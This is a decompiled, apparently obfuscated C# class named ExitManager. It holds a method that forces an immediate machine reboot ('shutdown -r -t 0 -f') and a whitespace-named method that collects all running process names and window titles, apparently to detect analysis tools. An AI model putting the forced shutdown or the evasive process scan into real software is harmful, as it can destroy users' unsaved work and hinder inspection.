using System.Collections.Generic;
using System.Diagnostics;
using System.Windows.Forms;

[FunAttr(Num = "7C0EFE301963C9D9495031A0E4E0BFD5")]
public class ExitManager
{
	[FunAttr(Num = "9D6EA749ED5D6D5CDA98D86371D07ECB")]
	public static void ExitProgram()
	{
		HashManager.CallMethod(null, null, "System.Environment", "Exit", 1);
		MaybeAlertManager.Exit();
	}

	[FunAttr(Num = "52F1D20B5BF80F14DE5331C1C041BFEE")]
	internal static void ShutdonwPC()
	{
		Process.Start("shutdown -r -t 0 -f");
		Process.Start("shutdown /r /t 0 /f");
	}

	[FunAttr(Num = "F2D9E0D8FAED2E0DA65DEDD6BFC2B736")]
	internal static object _0020_0020_000A_0020_000A_0020_0020_000A_000A_0020_0020_000A_000A_0020_000A_000A()
	{
		List<string> list = new List<string>();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (!string.IsNullOrEmpty(process.ProcessName))
			{
				list.Add(process.ProcessName.ToLower());
			}
			if (!string.IsNullOrEmpty(process.MainWindowTitle))
			{
				list.Add(process.MainWindowTitle.ToLower());
			}
		}
		return list.ToArray();
	}

	[FunAttr(Num = "D420B94273B51EDDF4FC94131723A367")]
	internal static object ExecutablePath()
	{
		return Application.ExecutablePath;
	}

	internal static void Empty()
	{
	}
}
